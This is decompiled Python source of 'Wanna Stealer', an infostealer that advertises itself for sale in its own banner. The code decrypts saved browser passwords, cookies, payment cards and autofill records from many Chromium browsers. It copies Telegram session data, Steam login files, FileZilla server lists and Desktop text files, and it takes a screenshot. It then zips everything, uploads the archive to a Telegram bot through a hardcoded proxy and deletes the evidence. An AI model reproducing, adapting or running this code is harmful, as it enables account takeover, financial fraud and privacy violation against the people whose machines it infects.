# uncompyle6 version 3.3.1
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 23:09:28) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: xpom.py
# Size of source mod 2**32: 5750 bytes
import base64, codecs, platform, time, psutil, wmi, datetime, locale, shutil, sqlite3, sys, os, shutil, requests, glob, io, string, ctypes
from dpapi import Win32CryptUnprotectData
from helpers import *
from shutil import copy2
from re import findall
from mss import mss

token = 'telegram bot token'
telid = 'telegram account id'


username = os.getlogin()
if os.path.exists('C:\\Users\\' + username + '\\AppData\\Roaming\\System'):
    sys.exit()
open('C:\\Users\\' + username + '\\AppData\\Roaming\\System', 'w').close()
proxies = {'http':'socks5://QpACQN:wLz780@196.17.67.19:8000', 
 'https':'socks5://QpACQN:wLz780@196.17.67.19:8000'}
#Coded by Wanna Soft, взломал? А теперь шасшифровывай. lolzteam.net/threads/1059860

import ctypes, string, codecs, platform, time, psutil, wmi, datetime, locale, shutil, sqlite3, sys, os, shutil, requests, glob, io
from dpapi import Win32CryptUnprotectData
from helpers import *
from shutil import copy2
from re import findall
from mss import mss

username = os.getlogin()

if not os.path.exists('C:\\Users\\' + username + '\\AppData\\Roaming\\Log'):
    os.mkdir('C:\\Users\\' + username + '\\AppData\\Roaming\\Log')
pathusr = os.path.expanduser('~')

browser_chrome = {    
        'google_chrome': pathusr + '\\AppData\\Local\\Google\\Chrome\\User Data\\',
        'google_chromex86': pathusr + '\\AppData\\Local\\Google (x86)\\Chrome\\User Data\\',
        'vivaldi': pathusr + '\\AppData\\Local\\Vivaldi\\User Data\\',
        'opera': pathusr + '\\AppData\\Roaming\\Opera Software\\',
        'kometa': pathusr + '\\AppData\\Local\\Kometa\\User Data\\',
        'orbitum': pathusr + '\\AppData\\Local\\Orbitum\\User Data\\',
        'comodo_dragon': pathusr + '\\AppData\\Local\\Comodo\\Dragon\\User Data\\',
        'amigo': pathusr + '\\AppData\\Local\\Amigo\\User\\User Data\\',
        'torch': pathusr + '\\AppData\\Local\\Torch\\User Data\\',
        'yandex': pathusr + '\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\',
        'comodo': pathusr + '\\AppData\\Local\\Comodo\\User Data\\',
        '360br': pathusr + '\\AppData\\Local\\360Browser\\Browser\\User Data\\',
        'maxtron': pathusr + '\\AppData\\Local\\Maxthon3\\User Data\\',
        'kmelon': pathusr + '\\AppData\\Local\\K-Melon\\User Data\\',
        'chromium': pathusr + '\\AppData\\Local\\Chromium\\User Data\\',
        'sputnik': pathusr + '\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\',
        'nichrome': pathusr + '\\AppData\\Local\\Nichrome\\User Data\\',
        'coccoc': pathusr + '\\AppData\\Local\\CocCoc\\Browser\\User Data\\',
        'uran': pathusr + '\\AppData\\Local\\Uran\\User Data\\',
        'chromodo': pathusr + '\\AppData\\Local\\Chromodo\\User Data\\',
                }


profiles_chrome = {
        'profile1': 'Profile 1\\', 
        'profile2': 'Profile 2\\', 
        'profile3': 'Profile 3\\', 
        'default': 'Default\\', 
        'opera': 'Opera Stable\\'
                }


db  = pathusr + '\\db1'
db2 = pathusr + '\\db2'
db3 = pathusr + '\\db3'


def login_chrome(file):
    count = 0
    logindata = 'Logins:\r\n'
    copy2(file, db)
    con = sqlite3.connect(db)
    cursor = con.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value from logins;')
    for origin_url, username_value, password_value in cursor.fetchall():
        password = Win32CryptUnprotectData(password_value).decode('utf-8')
        if password is not False:
            if origin_url is not '':
                logindata += 'Site : ' + str(origin_url) + '\r\n'
            if username_value is not '':
                logindata += 'Login  : ' + str(username_value)  + '\r\n'
            if password_value is not '':
                logindata += 'Password : ' + str(password) + '\r\n\r\n'
                count += 1
    return(count, logindata)


def cook_chrome(file):
    count = 0
    cookdata = 'Cookies:\r\n'
    copy2(file, db2)
    con = sqlite3.connect(db2)
    cursor = con.cursor()
    cursor.execute('SELECT host_key, name, value, path, last_access_utc, encrypted_value \
        FROM cookies;')
    for host_key, name, value, path, last_access_utc, encrypted_value in cursor.fetchall():
        decrypted = Win32CryptUnprotectData(encrypted_value).decode('utf-8') or value or 0
        if decrypted is not False:
            cookdata += str(host_key) + '\tTRUE\t' + '/' + '\tFALSE\t' + str(last_access_utc) + '\t' + \
            str(name) + '\t' + str(decrypted) + '\n'
            count += 1
    return(count, cookdata)


def web_chrome(file):
    count = 0
    webdata = 'Cards:\r\n'
    copy2(file, db3)
    con = sqlite3.connect(db3)
    cursor = con.cursor()
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year,\
     card_number_encrypted, billing_address_id FROM credit_cards;')
    for name_on_card, expiration_month, expiration_year,\
    card_number_encrypted, billing_address_id in cursor.fetchall():
        decrypted = Win32CryptUnprotectData(card_number_encrypted).decode('utf-8')
        if decrypted is not False:
            if name_on_card is not '':
                webdata += 'Bank: ' + name_on_card + '\r\n'
            if expiration_month is not '':
                webdata += 'Month: ' + expiration_month + '\r\n'
            if expiration_year is not '':
                webdata += 'Year: ' + expiration_year + '\r\n'
            if card_number_encrypted is not '':
                webdata += 'Card number: ' + decrypted + '\r\n'
            if billing_address_id is not '':
                webdata += 'Billing: ' + billing_address_id + '\r\n\r\n'

 
    cursor.execute('SELECT guid, company_name, street_address,\
     dependent_locality, city, state, zipcode, sorting_code,\
     country_code, date_modified, origin, language_code,\
     use_count, use_date, validity_bitfield FROM autofill_profiles')

    for company_name, street_address,\
     dependent_locality, city, state, zipcode, sorting_code,\
     country_code, date_modified, origin, language_code,\
     use_count, use_date, validity_bitfield in cursor.fetchall():
        webdata += 'Information\r\n'
        if company_name is not '':
            webdata += company_name + '\r\n'
        if street_address is not '':
            webdata += street_address + '\r\n'
        if dependent_locality is not '':
            webdata += dependent_locality + '\r\n'
        if city is not '':
            webdata += city + '\r\n'
        if state is not '':
            webdata += state + '\r\n'
        if zipcode is not '':
            webdata += zipcode + '\r\n'
        if sorting_code is not '':
            webdata += sorting_code + '\r\n'
        if country_code is not '':
            webdata += country_code + '\r\n'
        if date_modified is not '':
            webdata += date_modified + '\r\n'
        if origin is not '':
            webdata += origin + '\r\n'
        if language_code is not '':
            webdata += language_code + '\r\n'
        if use_count is not '':
            webdata += use_count + '\r\n'
        if use_date is not '':
            webdata += use_date + '\r\n'
        if validity_bitfield is not '':
            webdata += validity_bitfield + '\r\n'
        if company_name is not '':
            count += 1
            webdata += '\r\n\r\n'


    cursor.execute('SELECT email FROM autofill_profile_emails')
    for email in cursor.fetchall():
        webdata += 'Emails\r\n'
        if email is not '':
            webdata += email + '\r\n'
            count += 1


    cursor.execute('SELECT first_name, middle_name, last_name,\
     full_name FROM autofill_profile_names')
    for first_name, middle_name, last_name, full_name in cursor.fetchall():
        webdata += 'Anonim information\r\n'
        if first_name is not '':
            webdata += first_name + '\r\n'
        if middle_name is not '':
            webdata += middle_name + '\r\n'
        if last_name is not '':
            webdata += last_name + '\r\n'
        if full_name is not '':
            webdata += full_name + '\r\n'
            count += 1

    return(count, webdata)

def getXpom(savefolder):
    countpass, countcook, countdata = 0, 0, 0
    for browser_key, browser_folder in browser_chrome.items():
        if check_exists(browser_folder):
            for profile_key, profile_folder in profiles_chrome.items():
                if check_exists(browser_folder+profile_folder):
                    if check_exists(browser_folder+profile_folder+'\\Login Data'):
                        try:
                            countpass, logindata = login_chrome(browser_folder+profile_folder+'\\Login Data')
                            with open(savefolder + '\\' + browser_key+'_'+profile_key+'_logins.txt', 'w')\
                             as file:
                                file.write(logindata)
                        except Exception as e:
                            countpass += 0

                    if check_exists(browser_folder+profile_folder+'\\Cookies'):
                        try:
                            countcook, cookdata = cook_chrome(browser_folder+profile_folder+'\\Cookies')
                            with open(savefolder + '\\' + browser_key+'_'+profile_key+'_cookie.txt', 'w')\
                             as file:
                                file.write(cookdata)
                        except Exception as e:
                            countcook += 0

                    if check_exists(browser_folder+profile_folder+'\\Web Data'):
                        try:
                            countdata, webdata = web_chrome(browser_folder+profile_folder+'\\Web Data')
                            with open(savefolder + '\\' + browser_key+'_'+profile_key+'_ccdata.txt', 'w')\
                             as file:
                                file.write(webdata)
                        except Exception as e:
                            countdata += 0
    
    return(countpass, countcook, countdata)

if __name__ == '__main__':

    browsers = 'C:\\Users\\' + username + '\\AppData\\Roaming\\Log\\Browsers'
    if not check_exists(browsers):
        os.mkdir(browsers)
    getXpom(browsers)

source_files='C:/Users/'+os.getlogin()+'/Desktop/*.txt'
target_folder='C:/Users/'+os.getlogin()+'/AppData/Roaming/Log/Desktop Files'

def check_exists(file):
    if os.path.exists(file):
        return True
    else:
        return False
if not check_exists(target_folder):
    os.mkdir(target_folder)

filelist=glob.glob(source_files)
for single_file in filelist:
    shutil.copy(single_file,target_folder)

r = requests.get('http://ip.42.pl/raw')
ip = r.text

APPDATA_ROAMING = 'C:/Users/' + username + '/AppData/Roaming/Log/'

computer = wmi.WMI()

os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]

os_name = os_info.Name.encode('utf-8').split(b'|')[0].decode()
name = platform.node()
display_resolution = f'{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}'
display_language = locale.getdefaultlocale()[0]
datetime_ = time.strftime('%d/%m/%Y %H:%M:%S', time.gmtime())
timezone = datetime.datetime.now(datetime.timezone.utc).astimezone().tzinfo

processor = proc_info.Name
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576 
gpu = gpu_info.Name

processes = []
for p in psutil.process_iter(attrs=None, ad_value=None):
    processes.append((p.name(), p.pid))

products = []
for product in computer.Win32_Product():
    products.append((product.Caption, product.Version))

with open(f'{APPDATA_ROAMING}Information.txt', 'w', encoding='utf8') as file:
    file.write(f'|-------------------------------------------------|\n')
    file.write(f'|   Wanna Stealer, lolzteam.net/threads/1059860   |\n')
    file.write(f'|      Лучший стиллер, дешево и качественно       |\n')
    file.write(f'|            Продавец - t.me/stroleyman           |\n')
    file.write(f'|-------------------------------------------------|\n\n')
    file.write(f'Windows: {os_name}\n')
    file.write(f'Computer Name: {name}\n')
    file.write(f'User Name: {username}\n')
    file.write(f'IP: ' + ip + '\n')
    file.write(f'Display Resolution: {display_resolution}\n')
    file.write(f'Display Language: {display_language}\n')
    file.write(f'Local Time: {datetime_}\n')
    file.write(f'TimeZone: {timezone}\n\n')
    file.write('[Hardware]\n')
    file.write(f'Processor: {processor}\n')
    file.write(f'RAM: {system_ram}\n')
    file.write(f'VideoCard: {gpu}\n\n')
    file.write('[Processes]\n')
    for process in processes:
        file.write(f'- {process[0]} [{process[1]}]\n')
    file.write('\n[Software]\n')
    for product in products:
        file.write(f'{product[0]} [{product[1]}]\n')
  
try:
    basepath = 'C:/'
    folder_telegram = 'Telegram Desktop'
    hack_name = 'D877'
    hack_file = 'map'
    folder_write = 'C:/Users/' + username + '/AppData/Roaming/Log/Telegram'
    
    walk = os.walk(basepath)
    for dirpath, dirnames, files in walk:
        for folder_name in dirnames:
            if folder_name == folder_telegram:
                path = dirpath + '\\' + folder_telegram + '\\tdata'
                with os.scandir(path) as it:
                    for entry in it:
                        if (entry.is_dir()) and (hack_name in entry.name):
                            path_write = folder_write + '\\' + entry.name
                            os.makedirs(path_write)
                            with os.scandir(path + '\\' + entry.name) as it2:
                                for i in it2:
                                    if hack_file in i.name:
                                        shutil.copyfile(path + '\\' + entry.name + '\\' + i.name,
                                                        path_write + '\\' + i.name)
                        if (entry.is_file()) and (hack_name in entry.name):
                            shutil.copyfile(path + '\\' + entry.name, folder_write + '\\' + entry.name)
except:
  pass
  
try:
    basepath = 'C:/'
    file_steam = 'Steam.exe'
    hack_folder_steam = 'config'
    hack_file_steam = ['config.vdf', 'loginusers.vdf', 'DialogConfig.vdf', 'filterlist.vdf']
    parth_name_steam = 'ssfn'
    folder_write_steam = 'C:/Users/' + username + '/AppData/Roaming/Log/Steam/'
    exit = False

    walk = os.walk(basepath)
    for dirpath, dirnames, files in walk:
        for file_name in files:
            if file_name == file_steam:
                path = dirpath + '\\' + hack_folder_steam
                path2 = dirpath
                os.makedirs(folder_write_steam)
                for name in hack_file_steam:
                    shutil.copyfile(path + '\\' + name, folder_write_steam + name)
                with os.scandir(path2) as it:
                    for entry in it:
                        if (entry.is_file()) and (parth_name_steam in entry.name):
                            shutil.copyfile(path2 + '\\' + entry.name, folder_write_steam + entry.name)
except:
  pass


try:
    shutil.copy('C:/Users/' + username + '/AppData/Roaming/FileZilla/recentserver.xml', 'C:/Users/' + username + '/AppData/Roaming/Log')
except:
  pass

os.chdir('C:/Users/' + username + '/AppData/Roaming/Log')

with mss() as sct:
    sct.shot()

try:
    shutil.make_archive('C:/Users/' + username + '/AppData/Roaming/Log', 'zip', 'C:/Users/' + username + '/AppData/Roaming/Log')
except:
  pass

r = requests.get('http://ip.42.pl/raw')
ip = r.text


def send_document(document):
    return requests.post('https://api.telegram.org/bot{}/sendDocument?chat_id={}'.format(token, telid), proxies=proxies, files={'document': doc}, timeout=100000)


doc = open('C:\\\\Users\\\\' + username + '\\AppData\\Roaming\\Log.zip', 'rb')
doc = io.BytesIO(doc.read())
doc.name = 'Log.zip'
resp = send_document(doc)

def send_text(text):
    return requests.get('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text='.format(token, telid) + text, proxies=proxies, timeout=100000)


resp = send_text('Новый пользователь: ' + ip + '\n')
shutil.rmtree('C:\\Users\\' + username + '\\AppData\\Roaming\\Log', ignore_errors=True)
os.remove('C:\\Users\\' + username + '\\AppData\\Roaming\\Log.zip')
